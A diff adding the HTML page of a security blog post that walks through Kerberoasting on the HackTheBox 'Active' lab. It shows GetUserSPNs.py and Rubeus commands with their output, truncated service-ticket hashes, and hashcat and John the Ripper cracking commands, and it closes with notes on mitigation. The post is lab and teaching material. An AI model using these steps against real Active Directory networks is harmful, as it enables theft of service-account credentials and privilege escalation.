@@ -1,0 +1,564 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto" data-theme="dark">
+
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="index, follow">
+<title>Cooking With Fire | SecFortress</title>
+<meta name="keywords" content="Windows, Active Directory">
+<meta name="description" content="Just another yet random blog to practicing Kerberoasting on Linux and Windows, focusing on practical steps with tools like Rubeus and GetUserSPNs.py.">
+<meta name="author" content="SecFortress">
+<link rel="canonical" href="http://localhost:1313/hacking/cooking_with_fire/">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.fd5566c526ae48aadabd950798a2dc3568536401560eae5caac3765a42a9e7b5.css" integrity="sha256-/VVmxSauSKravZUHmKLcNWhTZAFWDq5cqsN2WkKp57U=" rel="preload stylesheet" as="style">
+<link rel="icon" href="http://localhost:1313/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="http://localhost:1313/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="http://localhost:1313/favicon-32x32.png">
+<link rel="apple-touch-icon" href="http://localhost:1313/apple-touch-icon.png">
+<link rel="mask-icon" href="http://localhost:1313/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<link rel="alternate" hreflang="en" href="http://localhost:1313/hacking/cooking_with_fire/">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+</noscript><meta property="og:url" content="http://localhost:1313/hacking/cooking_with_fire/">
+  <meta property="og:site_name" content="SecFortress">
+  <meta property="og:title" content="Cooking With Fire">
+  <meta property="og:description" content="Just another yet random blog to practicing Kerberoasting on Linux and Windows, focusing on practical steps with tools like Rubeus and GetUserSPNs.py.">
+  <meta property="og:locale" content="en-us">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="hacking">
+    <meta property="article:tag" content="Windows">
+    <meta property="article:tag" content="Active Directory">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Cooking With Fire">
+<meta name="twitter:description" content="Just another yet random blog to practicing Kerberoasting on Linux and Windows, focusing on practical steps with tools like Rubeus and GetUserSPNs.py.">
+
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [
+    {
+      "@type": "ListItem",
+      "position":  1 ,
+      "name": "Hackings",
+      "item": "http://localhost:1313/hacking/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  2 ,
+      "name": "Cooking With Fire",
+      "item": "http://localhost:1313/hacking/cooking_with_fire/"
+    }
+  ]
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "Cooking With Fire",
+  "name": "Cooking With Fire",
+  "description": "Just another yet random blog to practicing Kerberoasting on Linux and Windows, focusing on practical steps with tools like Rubeus and GetUserSPNs.py.",
+  "keywords": [
+    "Windows", "Active Directory"
+  ],
+  "articleBody": "Overview I’m sure you’ve cooked with fire at least once — maybe in your grandma’s kitchen, over a campfire on a chilly night, or even on a rugged adventure. But this isn’t about roasting marshmallows or perfecting grandma’s stew. This is about cooking with a different kind of fire: Kerberoasting.\nForget the deep dives and heavy theories; this is just a no-fluff guide to get hands-on with Kerberoasting, both in Linux and Windows environments. So, grab your hacking tools — it’s time to turn up the heat and get cracking!\nJust before we move on, if you need a lab to practice this attack, you can set one up using the resources listed at the end of this blog. Shout out to a great OG in the field onecloudemoji\nSo, What is Kerberoasting??? According to a lot of sources, Kerberoasting isn’t about some secret barbecue recipe — it’s a clever technique attackers use to extract service account credentials from a Windows Active Directory environment. But let’s not get caught up in fancy definitions or technical jargon. Simply put, Kerberoasting is all about leveraging the way Kerberos authentication works to snatch those valuable hashes — the digital keys that can unlock a treasure trove of access across a network.\nUnlike other attacks, Kerberoasting doesn’t require admin privileges, and it can often go unnoticed by traditional defenses. The best part? You can cook up this attack from your attacker machine, quietly grabbing the ingredients (the service tickets) needed to crack the recipe (the NTLM hash) offline at your leisure.\nNow, let’s roll up our sleeves and get cooking! Also here is a typical diagram on how this works if it clicks \\m/.\n[ Attacker Machine ] | | 1. Request Service Ticket (TGS) | for a Service Account | v [ Active Directory Domain Controller ] | (Kerberos Key Distribution Center) | | 2. Responds with Service Ticket (TGS) | Encrypted with Service Account Key v [ Attacker Machine ] | | 3. Extract TGS from Memory | Using Kerberoasting Tool (e.g., Rubeus) | v [ Service Ticket (TGS) Captured ] | | 4. Perform Offline Cracking | of the TGS (Brute-force NTLM Hash) | v [ Cracked NTLM Hash of Service Account ] | | 5. Use Cracked Credentials | to Access Target Service v [ Target Service ] (e.g., SQL Server, File Share) Understanding the Kerberos Hash Types: Know Your Ingredients! Hash Type $krb5tgs$23$*Type 23 RC4 $krb5tgs$18$* Type 18 AES-256 $krb5tgs$17$* Type 17 AES-128 So, What Are These Hash Types?\nType 23 (RC4): This is the classic flavor of Kerberoasting hashes. It’s a bit outdated, but many systems still serve it up. Type 23 uses the RC4 encryption algorithm — not the strongest, but still very common, making it a frequent target. It’s like finding a well-aged cheese; you know it’ll crack easier!\nType 18 (AES-256): Now we’re talking premium quality! Type 18 uses AES-256 encryption, one of the strongest out there. Extracting this is like biting into a rare, hard-to-crack nut. It’ll take a lot more effort to break, but the payoff could be worth it.\nType 17 (AES-128): A little less intense than Type 18, but still not your everyday cracker. AES-128 is more secure than RC4 but slightly easier to crack than AES-256. Think of it as a medium-hot sauce — not too mild, not too fiery, but still packs a punch.\nRoasting From Linux When we run tools like GetUserSPNs.py, we’re hunting for Service Principal Names (SPNs) that can help us identify accounts with valuable service tickets.\n❯ GetUserSPNs.py -dc-ip 10.129.231.107 active.htb/SVC_TGS Impacket v0.12.0.dev1+20230909.154612.3beeda7 - Copyright 2023 Fortra Password: ServicePrincipalName Name MemberOf PasswordLastSet LastLogon Delegation -------------------- ------------- -------------------------------------------------------- -------------------------- -------------------------- ---------- active/CIFS:445 Administrator CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb 2018-07-18 20:06:40.351723 2024-09-05 08:02:03.710164 So, What Did We Find?\nThe output reveals an SPN for active/CIFS:445 associated with the Administrator account. This tells us that the Administrator is tied to a CIFS (Common Internet File System) service running on port 445. Knowing this, we can now plan our next steps for attacking or enumerating this service.\nWhat If We Found Other SPNs?\nIf we had seen SPNs like */SQL or */HTTP, we’d know that these accounts are associated with SQL or web services, respectively. This is crucial because it informs our strategy:\nSQL SPNs (*/SQL): We could explore connecting directly to a SQL server to query data, exploit SQL-specific vulnerabilities, or even dump credentials. HTTP SPNs (*/HTTP): This indicates web services, which might involve web application attacks, directory traversal, or credential brute-forcing over HTTP. Note that there are other popular SPNs like TERMSRV,WSMAN,RPC,LDAP,SMTP,HOST. By understanding the SPNs in front of us, we can quickly identify the best services to target and craft our next moves.\nNext, By using the -request flag with the GetUserSPNs.py script, we attempt to retrieve the TGS for the targeted service:\n❯ GetUserSPNs.py -dc-ip 10.129.231.107 active.htb/SVC_TGS -request Impacket v0.12.0.dev1+20230909.154612.3beeda7 - Copyright 2023 Fortra Password: ServicePrincipalName Name MemberOf PasswordLastSet LastLogon Delegation -------------------- ------------- -------------------------------------------------------- -------------------------- -------------------------- ---------- active/CIFS:445 Administrator CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb 2018-07-18 20:06:40.351723 2024-09-05 08:06:51.093868 [-] CCache file is not found. Skipping... $krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$91797afd7c953--SNIP-- What’s Happening Here?\nThe -request flag is doing the magic by asking the Domain Controller (DC) for a TGS ticket associated with the Administrator account for the CIFS service. The response contains a Kerberos ticket hash in the format $krb5tgs$23$*... — Bingo! This is the jackpot for our Kerberoasting attack. Understanding the Ticket:\nThe output provides a Type 23 Kerberos ticket ($krb5tgs$23$*), which uses RC4 encryption. Since RC4 is relatively weak by today’s standards, it becomes an ideal target for offline brute-forcing or dictionary attacks. We can now take this TGS hash and attempt to crack it using popular tools like John the Ripper or Hashcat to potentially retrieve the plaintext password. Roasting From Windows Before diving into the roasting, I always like to list stats first using the Rubeus tool. Why? This helps me see the different encryption types (Type 23, Type 18, Type 17) associated with various accounts and check when the password was last set. It’s a good habit for real-world engagements — after all, the fresher the password, the tougher it might be to crack!\nC:\\Users\u003e .\\Rubeus.exe kerberoast /stats ______ _ (_____ \\ | | _____) )_ _| |__ _____ _ _ ___ | __ /| | | | _ \\| ___ | | | |/___) | | \\ \\| |_| | |_) ) ____| |_| |___ | |_| |_|____/|____/|_____)____/(___/ v2.2.1 [*] Action: Kerberoasting [*] Listing statistics about target users, no ticket requests being performed. [*] Target Domain : active.htb [*] Searching path 'LDAP://DC.active.htb/DC=active,DC=htb' for '(\u0026(samAccountType=805306368)(servicePrincipalName=*)(!samAccountName=krbtgt)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))' [*] Total kerberoastable users : 1 ------------------------------------- | Supported Encryption Type | Count | ------------------------------------- | RC4_HMAC_DEFAULT | 1 | ------------------------------------- ---------------------------------- | Password Last Set Year | Count | ---------------------------------- | 2018 | 1 | ---------------------------------- As shown above, we don’t need the /tgtdeleg or the /rc4opsec switches because we’re not targeting specific TGT delegations or looking for RC4 hashes explicitly. Instead, we’re keeping it simple and efficient by focusing on what Rubeus reveals:\n------------------------------------- | Supported Encryption Type | Count | ------------------------------------- | RC4_HMAC_DEFAULT | 1 | ------------------------------------- With this output, we know there’s only one account using the RC4 encryption type — a prime target for Kerberoasting! By skipping the extra flags, we streamline the process, making our attack quicker and more straightforward. Just the way we like it: minimal ingredients, maximum flavor!\nC:\\Users\u003e .\\Rubeus.exe kerberoast /nowrap ______ _ (_____ \\ | | _____) )_ _| |__ _____ _ _ ___ | __ /| | | | _ \\| ___ | | | |/___) | | \\ \\| |_| | |_) ) ____| |_| |___ | |_| |_|____/|____/|_____)____/(___/ v2.2.1 [*] Action: Kerberoasting [*] NOTICE: AES hashes will be returned for AES-enabled accounts. [*] Use /ticket:X or /tgtdeleg to force RC4_HMAC for these accounts. [*] Target Domain : active.htb [*] Searching path 'LDAP://DC.active.htb/DC=active,DC=htb' for '(\u0026(samAccountType=805306368)(servicePrincipalName=*)(!samAccountName=krbtgt)(!(UserAccountControl:1.2.840.113556.1.4.803:=2))) ' [*] Total kerberoastable users : 1 [*] SamAccountName : Administrator [*] DistinguishedName : CN=Administrator,CN=Users,DC=active,DC=htb [*] ServicePrincipalName : active/CIFS:445 [-] Decoding error detected, consider running chcp.com at the target, map the result with https://docs.python.org/3/library/codecs.html#standard-encodings and then execute smbexec.py again with -codec and the corresponding codec [*] PwdLastSet : 18/7/2018 10:06:40 [*] Supported ETypes : RC4_HMAC_DEFAULT [*] Hash : $krb5tgs$23$*Administrator$active.htb$active/CIFS:445@active.htb*$F5--SNIP-- Note that, while we won’t delve deeply into every aspect of this attack, We covered practical methods using tools like Rubeus and getuserspn. Note that these tools offer a variety of options and techniques worth exploring on your own, beyond what we’ve touched on here.\nServing Dishes ; Hash Cracking This is a very straight forward one as after obtaining the hashes you still need to decrypt them for later use via authentication, You can clearly not submit a full TGS, as a password when asked right ?? 🤣\n######### Using John-The-Ripper ######### # --wordlist: Specify the path to your wordlist (e.g., rockyou.txt). # hash.txt: The file containing the TGS hash. john --wordlist=/path/to/wordlist.txt hash.txt ######### Using Hashcat ######### # -m 13100: Hash type for Kerberos 5 TGS-REP etype 23 (RC4). # -a 0: Attack mode (0 for dictionary attack). # hash.txt: The file containing your Kerberos TGS hash. # /path/to/wordlist.txt: The path to your wordlist. hashcat -m 13100 -a 0 hash.txt /path/to/wordlist.txt Extras : Fixing Kerberos Clock Skew Too Great Resolved Ever seen the error “Kerberos Clock Skew Too Great” and wondered why your carefully planned attack — or legitimate authentication — isn’t working? This error occurs when there is a significant time difference (typically more than 5 minutes) between the client, server, and the Key Distribution Center (KDC) in a Kerberos environment.\nWhy Does This Happen?\nKerberos relies heavily on time synchronization to prevent replay attacks. If the clocks of the devices involved are out of sync beyond the allowed threshold, authentication requests are rejected with this error. This could be fixed with this simple below commands :\ntimedatectl set-ntp off sudo rdate -n [DC-IP of Target] # -n: use SNTP instead of RFC868 time protocol ######### Reset back to the default once done ######### timedatectl set-ntp on timedatectl status Wrapping Up: The Danger of Kerberoasting Kerberoasting is a potent technique in an attacker’s arsenal. Understanding its risks and maintaining robust security practices are vital to protecting your network and sensitive information.\nAccess to High-Value Accounts: Kerberoasting targets service accounts, often with elevated privileges. Cracking these tickets can lead to full administrative access, allowing attackers to pivot through the network and escalate privileges.\nWeak Encryption is a Weakness: Many environments still use outdated encryption types like RC4 (Type 23). These weaker encryption methods are more susceptible to cracking, making them easier targets for attackers with the right tools and techniques.\nMinimal Effort, High Reward: Once attackers have the Kerberos tickets, cracking them can be straightforward with tools like John the Ripper and Hashcat. This means attackers can potentially gain access without significant effort, exploiting weak spots in the system’s security.\nMitigation Matters: Regularly updating service account passwords and using strong encryption methods are crucial defenses. Monitoring and auditing Kerberos tickets and leveraging tools to detect unusual activity can also help mitigate the risk.\nResources Kerberoasting Blogs From Adsecurity.org Setting Up a Kerberoasting lab by James Hay X Onecloudemoji ",
+  "wordCount" : "1864",
+  "inLanguage": "en",
+  "datePublished": "0001-01-01T00:00:00Z",
+  "dateModified": "0001-01-01T00:00:00Z",
+  "author":{
+    "@type": "Person",
+    "name": "SecFortress"
+  },
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "http://localhost:1313/hacking/cooking_with_fire/"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "SecFortress",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "http://localhost:1313/favicon.ico"
+    }
+  }
+}
+</script>
+</head>
+<body id="top">
+    <header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="http://localhost:1313/" accesskey="h" title="SecFortress (Alt + H)">
+                <img src="http://localhost:1313/images/avatar.jpeg" alt="" aria-label="logo"
+                    height="25">SecFortress</a>
+            <div class="logo-switches">
+            </div>
+        </div>
+        <ul id="menu">
+            <li>
+                <a href="http://localhost:1313/" title="Home">
+                    <span>Home</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/hacking" title="🥷 Hacking">
+                    <span>🥷 Hacking</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/tags" title="Tags">
+                    <span>Tags</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/search" title="Search (Alt &#43; /)" accesskey=/>
+                    <span>Search</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://sec-fortress.github.io/" title="✍️ Notes">
+                    <span>✍️ Notes</span>&nbsp;
+                    <svg fill="none" shape-rendering="geometricPrecision" stroke="currentColor" stroke-linecap="round"
+                        stroke-linejoin="round" stroke-width="2.5" viewBox="0 0 24 24" height="12" width="12">
+                        <path d="M18 13v6a2 2 0 01-2 2H5a2 2 0 01-2-2V8a2 2 0 012-2h6"></path>
+                        <path d="M15 3h6v6"></path>
+                        <path d="M10 14L21 3"></path>
+                    </svg>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/whoami" title="🇳🇬 Whoami">
+                    <span>🇳🇬 Whoami</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+<main class="main">
+
+<article class="post-single">
+  <header class="post-header">
+    <div class="breadcrumbs"><a href="http://localhost:1313/">Home</a>&nbsp;»&nbsp;<a href="http://localhost:1313/hacking/">Hackings</a></div>
+    <h1 class="post-title entry-hint-parent">
+      Cooking With Fire
+    </h1>
+    <div class="post-description">
+      Just another yet random blog to practicing Kerberoasting on Linux and Windows, focusing on practical steps with tools like Rubeus and GetUserSPNs.py.
+    </div>
+    <div class="post-meta"><span>9 min</span>&nbsp;·&nbsp;<span>SecFortress</span>
+
+</div>
+  </header> <div class="toc">
+    <details >
+        <summary accesskey="c" title="(Alt + C)">
+            <span class="details">Table of Contents</span>
+        </summary>
+
+        <div class="inner"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#overview"><strong>Overview</strong></a></li>
+    <li><a href="#so-what-is-kerberoasting"><strong>So, What is Kerberoasting???</strong></a></li>
+    <li><a href="#understanding-the-kerberos-hash-types-know-your-ingredients"><strong>Understanding the Kerberos Hash Types: Know Your Ingredients!</strong></a></li>
+    <li><a href="#roasting-from-linux"><strong>Roasting From Linux</strong></a></li>
+    <li><a href="#roasting-from-windows"><strong>Roasting From Windows</strong></a></li>
+    <li><a href="#serving-dishes--hash-cracking"><strong>Serving Dishes ; Hash Cracking</strong></a></li>
+    <li><a href="#extras--fixing-kerberos-clock-skew-too-great-resolved"><strong>Extras : Fixing Kerberos Clock Skew Too Great Resolved</strong></a></li>
+    <li><a href="#wrapping-up-the-danger-of-kerberoasting"><strong>Wrapping Up: The Danger of Kerberoasting</strong></a></li>
+    <li><a href="#resources"><strong>Resources</strong></a></li>
+  </ul>
+</nav>
+        </div>
+    </details>
+</div>
+
+  <div class="post-content"><h2 id="overview"><strong>Overview</strong><a hidden class="anchor" aria-hidden="true" href="#overview">#</a></h2>
+<p>I&rsquo;m sure you&rsquo;ve cooked with fire at least once — maybe in your grandma&rsquo;s kitchen, over a campfire on a chilly night, or even on a rugged adventure. But this isn&rsquo;t about roasting marshmallows or perfecting grandma&rsquo;s stew. This is about cooking with a different kind of fire: <strong>Kerberoasting</strong>.</p>
+<p><img loading="lazy" src="https://i.imgur.com/ihzxavI.png"></p>
+<p>Forget the deep dives and heavy theories; this is just a no-fluff guide to get hands-on with Kerberoasting, both in Linux and Windows environments. So, grab your hacking tools — it&rsquo;s time to turn up the heat and get cracking!</p>
+<p><img loading="lazy" src="https://i.imgur.com/iFHRvAa.png"></p>
+<p>Just before we move on, if you need a lab to practice this attack, you can set one up using the resources listed at the end of this blog. Shout out to a great OG in the field  <a href="https://x.com/OneCloudEmoji">onecloudemoji</a></p>
+<p><img loading="lazy" src="https://i.pinimg.com/originals/2d/f7/17/2df717b43d9d9a876a98c41b909e6c65.gif"></p>
+<h2 id="so-what-is-kerberoasting"><strong>So, What is Kerberoasting???</strong><a hidden class="anchor" aria-hidden="true" href="#so-what-is-kerberoasting">#</a></h2>
+<p>According to a lot of sources, Kerberoasting isn’t about some secret barbecue recipe — it&rsquo;s a clever technique attackers use to extract service account credentials from a Windows Active Directory environment. But let&rsquo;s not get caught up in fancy definitions or technical jargon. Simply put, Kerberoasting is all about leveraging the way Kerberos authentication works to snatch those valuable hashes — the digital keys that can unlock a treasure trove of access across a network.</p>
+<p>Unlike other attacks, Kerberoasting doesn&rsquo;t require admin privileges, and it can often go unnoticed by traditional defenses. The best part? You can cook up this attack from your attacker machine, quietly grabbing the ingredients (the service tickets) needed to crack the recipe (the NTLM hash) offline at your leisure.</p>
+<p>Now, let’s roll up our sleeves and get cooking! Also here is a typical diagram on how this works if it clicks <code>\m/</code>.</p>
+<pre tabindex="0"><code>     [ Attacker Machine ]                           
+           |                                        
+           |  1. Request Service Ticket (TGS)         
+           |   for a Service Account                 
+           |                                        
+           v                                        
+[ Active Directory Domain Controller ]               
+     |  (Kerberos Key Distribution Center)             
+     |                                               
+     |  2. Responds with Service Ticket (TGS)         
+     |      Encrypted with Service Account Key       
+     v                                               
+     [ Attacker Machine ]                            
+           |                                        
+           |  3. Extract TGS from Memory             
+           |   Using Kerberoasting Tool (e.g., Rubeus)
+           |                                        
+           v                                        
+ [ Service Ticket (TGS) Captured ]                   
+           |                                        
+           |  4. Perform Offline Cracking            
+           |   of the TGS (Brute-force NTLM Hash)    
+           |                                        
+           v                                        
+[ Cracked NTLM Hash of Service Account ]              
+           |                                         
+           |  5. Use Cracked Credentials              
+           |   to Access Target Service               
+           v                                        
+       [ Target Service ]                            
+     (e.g., SQL Server, File Share)
+</code></pre><h2 id="understanding-the-kerberos-hash-types-know-your-ingredients"><strong>Understanding the Kerberos Hash Types: Know Your Ingredients!</strong><a hidden class="anchor" aria-hidden="true" href="#understanding-the-kerberos-hash-types-know-your-ingredients">#</a></h2>
+<table>
+  <thead>
+      <tr>
+          <th>Hash</th>
+          <th>Type</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td><code>$krb5tgs$23$*</code>Type 23</td>
+          <td>RC4</td>
+      </tr>
+      <tr>
+          <td><code>$krb5tgs$18$*</code> Type 18</td>
+          <td>AES-256</td>
+      </tr>
+      <tr>
+          <td><code>$krb5tgs$17$*</code> Type 17</td>
+          <td>AES-128</td>
+      </tr>
+  </tbody>
+</table>
+<p><strong>So, What Are These Hash Types?</strong></p>
+<ul>
+<li>
+<p><strong>Type 23 (<code>RC4</code>):</strong> This is the <em>classic flavor</em> of Kerberoasting hashes. It&rsquo;s a bit outdated, but many systems still serve it up. Type 23 uses the <code>RC4</code> encryption algorithm — not the strongest, but still very common, making it a frequent target. It’s like finding a well-aged cheese; you know it’ll crack easier!</p>
+</li>
+<li>
+<p><strong>Type 18 (AES-256):</strong> Now we’re talking premium quality! Type 18 uses AES-256 encryption, one of the strongest out there. Extracting this is like biting into a rare, hard-to-crack nut. It’ll take a lot more effort to break, but the payoff could be worth it.</p>
+</li>
+<li>
+<p><strong>Type 17 (AES-128):</strong> A little less intense than Type 18, but still not your everyday cracker. AES-128 is more secure than <code>RC4</code> but slightly easier to crack than AES-256. Think of it as a medium-hot sauce — not too mild, not too fiery, but still packs a punch.</p>
+</li>
+</ul>
+<h2 id="roasting-from-linux"><strong>Roasting From Linux</strong><a hidden class="anchor" aria-hidden="true" href="#roasting-from-linux">#</a></h2>
+<p>When we run tools like <code>GetUserSPNs.py</code>, we&rsquo;re hunting for Service Principal Names (SPNs) that can help us identify accounts with valuable service tickets.</p>
+<pre tabindex="0"><code>❯ GetUserSPNs.py -dc-ip 10.129.231.107 active.htb/SVC_TGS
+Impacket v0.12.0.dev1+20230909.154612.3beeda7 - Copyright 2023 Fortra
+
+Password:
+ServicePrincipalName  Name           MemberOf                                                  PasswordLastSet             LastLogon                   Delegation 
+--------------------  -------------  --------------------------------------------------------  --------------------------  --------------------------  ----------
+active/CIFS:445       Administrator  CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb  2018-07-18 20:06:40.351723  2024-09-05 08:02:03.710164
+</code></pre><p><strong>So, What Did We Find?</strong></p>
+<p>The output reveals an SPN for <strong><code>active/CIFS:445</code></strong> associated with the <code>Administrator</code> account. This tells us that the <code>Administrator</code> is tied to a CIFS (Common Internet File System) service running on port 445. Knowing this, we can now plan our next steps for attacking or enumerating this service.</p>
+<p><strong>What If We Found Other SPNs?</strong></p>
+<p>If we had seen SPNs like <strong><code>*/SQL</code></strong> or <strong><code>*/HTTP</code></strong>, we’d know that these accounts are associated with SQL or web services, respectively. This is crucial because it informs our strategy:</p>
+<ul>
+<li><strong>SQL SPNs (<code>*/SQL</code>):</strong> We could explore connecting directly to a SQL server to query data, exploit SQL-specific vulnerabilities, or even dump credentials.</li>
+<li><strong>HTTP SPNs (<code>*/HTTP</code>):</strong> This indicates web services, which might involve web application attacks, directory traversal, or credential brute-forcing over HTTP.</li>
+</ul>
+<blockquote>
+<p>Note that there are other popular SPNs like <code>TERMSRV</code>,<code>WSMAN</code>,<code>RPC</code>,<code>LDAP</code>,<code>SMTP</code>,<code>HOST</code>. By understanding the SPNs in front of us, we can quickly identify the best services to target and craft our next moves.</p>
+</blockquote>
+<p>Next, By using the <code>-request</code> flag with the <code>GetUserSPNs.py</code> script, we attempt to retrieve the TGS for the targeted service:</p>
+<pre tabindex="0"><code>❯ GetUserSPNs.py -dc-ip 10.129.231.107 active.htb/SVC_TGS -request
+Impacket v0.12.0.dev1+20230909.154612.3beeda7 - Copyright 2023 Fortra
+
+Password:
+ServicePrincipalName  Name           MemberOf                                                  PasswordLastSet             LastLogon                   Delegation 
+--------------------  -------------  --------------------------------------------------------  --------------------------  --------------------------  ----------
+active/CIFS:445       Administrator  CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb  2018-07-18 20:06:40.351723  2024-09-05 08:06:51.093868             
+
+
+
+[-] CCache file is not found. Skipping...
+$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$91797afd7c953--SNIP--
+</code></pre><p><strong>What&rsquo;s Happening Here?</strong></p>
+<ul>
+<li>The <code>-request</code> flag is doing the magic by asking the Domain Controller (DC) for a TGS ticket associated with the <strong><code>Administrator</code></strong> account for the <code>CIFS</code> service.</li>
+<li>The response contains a Kerberos ticket hash in the format <strong><code>$krb5tgs$23$*...</code></strong> — <strong>Bingo!</strong> This is the jackpot for our Kerberoasting attack.</li>
+</ul>
+<p><strong>Understanding the Ticket:</strong></p>
+<ul>
+<li>The output provides a <strong>Type 23</strong> Kerberos ticket (<code>$krb5tgs$23$*</code>), which uses <strong>RC4 encryption</strong>. Since RC4 is relatively weak by today&rsquo;s standards, it becomes an ideal target for offline brute-forcing or dictionary attacks.</li>
+<li>We can now take this TGS hash and attempt to crack it using popular tools like <strong><code>John the Ripper</code></strong> or <strong><code>Hashcat</code></strong> to potentially retrieve the plaintext password.</li>
+</ul>
+<h2 id="roasting-from-windows"><strong>Roasting From Windows</strong><a hidden class="anchor" aria-hidden="true" href="#roasting-from-windows">#</a></h2>
+<p>Before diving into the roasting, I always like to list stats first using the <code>Rubeus</code> tool. Why? This helps me see the different encryption types (<code>Type 23</code>, <code>Type 18</code>, <code>Type 17</code>) associated with various accounts and check when the password was last set. It&rsquo;s a good habit for real-world engagements — after all, the fresher the password, the tougher it might be to crack!</p>
+<pre tabindex="0"><code>C:\Users&gt; .\Rubeus.exe kerberoast /stats
+
+   ______        _                      
+  (_____ \      | |                     
+   _____) )_   _| |__  _____ _   _  ___ 
+  |  __  /| | | |  _ \| ___ | | | |/___)
+  | |  \ \| |_| | |_) ) ____| |_| |___ |
+  |_|   |_|____/|____/|_____)____/(___/
+
+  v2.2.1 
+
+
+[*] Action: Kerberoasting
+
+[*] Listing statistics about target users, no ticket requests being performed.
+[*] Target Domain          : active.htb
+[*] Searching path &#39;LDAP://DC.active.htb/DC=active,DC=htb&#39; for &#39;(&amp;(samAccountType=805306368)(servicePrincipalName=*)(!samAccountName=krbtgt)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))&#39;
+
+[*] Total kerberoastable users : 1
+
+
+ ------------------------------------- 
+ | Supported Encryption Type | Count |
+ ------------------------------------- 
+ | RC4_HMAC_DEFAULT          | 1     |
+ ------------------------------------- 
+
+ ---------------------------------- 
+ | Password Last Set Year | Count |
+ ---------------------------------- 
+ | 2018                   | 1     |
+ ----------------------------------
+</code></pre><p><strong>As shown above, we don&rsquo;t need the <code>/tgtdeleg</code> or the <code>/rc4opsec</code> switches</strong> because we&rsquo;re not targeting specific TGT delegations or looking for RC4 hashes explicitly. Instead, we&rsquo;re keeping it simple and efficient by focusing on what <code>Rubeus</code> reveals:</p>
+<pre tabindex="0"><code>-------------------------------------
+| Supported Encryption Type | Count |
+-------------------------------------
+| RC4_HMAC_DEFAULT          | 1     |
+-------------------------------------
+</code></pre><p>With this output, we know there&rsquo;s only one account using the RC4 encryption type — a prime target for Kerberoasting! By skipping the extra flags, we streamline the process, making our attack quicker and more straightforward. Just the way we like it: minimal ingredients, maximum flavor!</p>
+<pre tabindex="0"><code>C:\Users&gt; .\Rubeus.exe kerberoast /nowrap
+
+   ______        _                      
+  (_____ \      | |                     
+   _____) )_   _| |__  _____ _   _  ___ 
+  |  __  /| | | |  _ \| ___ | | | |/___)
+  | |  \ \| |_| | |_) ) ____| |_| |___ |
+  |_|   |_|____/|____/|_____)____/(___/
+
+  v2.2.1
+
+
+[*] Action: Kerberoasting
+
+[*] NOTICE: AES hashes will be returned for AES-enabled accounts.
+[*]         Use /ticket:X or /tgtdeleg to force RC4_HMAC for these accounts.
+
+[*] Target Domain          : active.htb        
+[*] Searching path &#39;LDAP://DC.active.htb/DC=active,DC=htb&#39; for &#39;(&amp;(samAccountType=805306368)(servicePrincipalName=*)(!samAccountName=krbtgt)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))
+&#39;                                                                                                                                                                                             
+
+[*] Total kerberoastable users : 1
+
+
+[*] SamAccountName         : Administrator                                                     
+[*] DistinguishedName      : CN=Administrator,CN=Users,DC=active,DC=htb                        
+[*] ServicePrincipalName   : active/CIFS:445                                                   
+[-] Decoding error detected, consider running chcp.com at the target,
+map the result with https://docs.python.org/3/library/codecs.html#standard-encodings
+and then execute smbexec.py again with -codec and the corresponding codec                                                                                                                     [*] PwdLastSet             : 18/7/2018 10:06:40   
+
+[*] Supported ETypes       : RC4_HMAC_DEFAULT
+[*] Hash                   : $krb5tgs$23$*Administrator$active.htb$active/CIFS:445@active.htb*$F5--SNIP--
+</code></pre><blockquote>
+<p>Note that, while we won&rsquo;t delve deeply into every aspect of this attack, We covered practical methods using tools like <code>Rubeus</code> and <code>getuserspn</code>. Note that these tools offer a variety of options and techniques worth exploring on your own, beyond what we&rsquo;ve touched on here.</p>
+</blockquote>
+<h2 id="serving-dishes--hash-cracking"><strong>Serving Dishes ; Hash Cracking</strong><a hidden class="anchor" aria-hidden="true" href="#serving-dishes--hash-cracking">#</a></h2>
+<p><img loading="lazy" src="https://i.imgur.com/O7aRlqN.png"></p>
+<p>This is a very straight forward one as after obtaining the hashes you still need to decrypt them for later use via authentication, You can clearly not submit a full TGS, as a password when asked right ?? 🤣</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1">######### Using John-The-Ripper #########</span>
